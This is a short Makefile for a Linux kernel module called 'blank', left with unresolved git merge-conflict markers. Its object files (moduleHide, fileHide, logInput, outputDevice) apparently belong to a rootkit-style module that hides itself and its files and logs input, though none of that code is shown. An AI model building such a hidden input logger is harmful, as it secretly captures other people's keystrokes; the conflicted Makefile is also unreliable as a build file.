# Makefile with support for multiple files for kernel modules based on:
# http://www.paguilar.org/blog/?p=7

# Make sure you run with sudo if you install/uninstall!

# If it complains about the module not existing when you run install, don't worry - it's just
# trying to uninstall any previously running instances for you, and will install it for you anyway

moduleName = blank
obj-m += $(moduleName).o
<<<<<<< HEAD
<<<<<<< HEAD
blank-objs += main.o moduleHide.o outputDeviceUsingTTY.o logInput.o output.o
=======
blank-objs += main.o fileHide.o moduleHide.o outputDevice.o logInput.o 

PWD = $(shell pwd)
>>>>>>> ac6e697adaa6a2394cb712da272fe64910605e53
=======
blank-objs += main.o moduleHide.o outputDevice.o logInput.o output.o
>>>>>>> parent of a401c64... trying to get code from example online to compile  - commenting out code

all:
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) clean

install: all uninstallSilently
	insmod ./$(moduleName).ko

uninstall:
	-rmmod $(moduleName)
	
uninstallSilently:
	-@rmmod $(moduleName)
